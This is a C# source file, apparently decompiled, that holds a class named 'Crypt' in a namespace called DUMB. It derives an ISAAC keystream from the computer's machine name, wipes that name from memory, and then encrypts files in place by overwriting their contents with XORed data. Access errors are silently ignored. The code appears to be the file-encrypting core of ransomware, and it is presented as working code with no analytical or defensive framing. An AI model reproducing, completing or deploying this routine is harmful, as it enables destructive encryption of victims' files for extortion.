using System;
using System.IO;
using System.Net;
using System.Text;

namespace DUMB;

public class Crypt
{
	public const int TUMBLE = 3;

	public static ISAAC PrepareKey()
	{
		try
		{
			string machineName = Environment.MachineName;
			byte[] bytes = Encoding.UTF8.GetBytes(machineName);
			ISAAC iSAAC = new ISAAC();
			for (int i = 0; i < 3; i++)
			{
				iSAAC.Isaac();
			}
			for (int j = 0; j < bytes.Length; j++)
			{
				iSAAC.mem[j] = bytes[j];
			}
			StringBuilder stringBuilder = new StringBuilder(machineName.Length);
			for (int k = 0; k < machineName.Length; k++)
			{
				stringBuilder.Append(' ');
			}
			machineName = stringBuilder.ToString();
			for (int l = 0; l < bytes.Length; l++)
			{
				bytes[l] = 0;
			}
			machineName = null;
			bytes = null;
			for (int m = 0; m < 3; m++)
			{
				iSAAC.Isaac();
			}
			return iSAAC;
		}
		catch (WebException)
		{
			return null;
		}
		catch
		{
			return null;
		}
	}

	public static void CryptFile(ISAAC csprng, byte[] subkey, string loc)
	{
		FileStream fileStream = null;
		int[] array = null;
		try
		{
			fileStream = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			array = new int[512];
			for (int i = 0; i < 512; i++)
			{
				array[i] = csprng.mem[i];
			}
			for (int j = 0; j < subkey.Length; j++)
			{
				csprng.mem[j] ^= subkey[j];
			}
			byte[] array2 = new byte[512];
			int num = fileStream.Read(array2, 0, 512);
			do
			{
				csprng.Isaac();
				for (int k = 0; k < num; k++)
				{
					array2[k] = (byte)((array2[k] ^ csprng.rsl[k]) % 256);
				}
				fileStream.Seek(-num, SeekOrigin.Current);
				fileStream.Write(array2, 0, num);
			}
			while ((num = fileStream.Read(array2, 0, 512)) > 0);
		}
		catch (UnauthorizedAccessException)
		{
		}
		finally
		{
			if (fileStream != null)
			{
				fileStream.Close();
				fileStream.Dispose();
			}
			if (array != null)
			{
				csprng.mem = array;
				csprng.Isaac();
			}
		}
	}
}
